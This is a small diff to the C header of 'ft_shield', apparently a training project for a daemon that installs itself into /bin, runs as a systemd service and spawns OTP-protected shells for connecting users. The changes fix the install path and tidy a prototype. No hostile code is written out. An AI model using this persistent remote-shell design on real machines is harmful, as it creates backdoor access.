@@ -36,7 +36,7 @@
 #define LOG_FILE  LOG_PATH LOG_NAME
 // executable
 #define EXECUTABLE_NAME "ft_shield"
-#define EXECUTABLE_PATH "/bin"
+#define EXECUTABLE_PATH "/bin/"
 #define EXECUTABLE_FILE EXECUTABLE_PATH EXECUTABLE_NAME
 // system init
 #define SYSTEMD_NAME "ft_shield.service"
@@ -87,6 +87,6 @@ void        add_user(int fd, t_daemon *daemon);
 void        delete_user(int pollfd_position, t_daemon *daemon);
 void        create_shell(int fd, t_daemon *daemon);
 bool        authenticate(char *codigo_otp);
-void        pid_waiter(t_daemon *daemon) //revisar pids de shell y ver su estado para eliminarlos y calcualr cuantas shells hay actualmente;
+void        pid_waiter(t_daemon *daemon);
 
 #endif
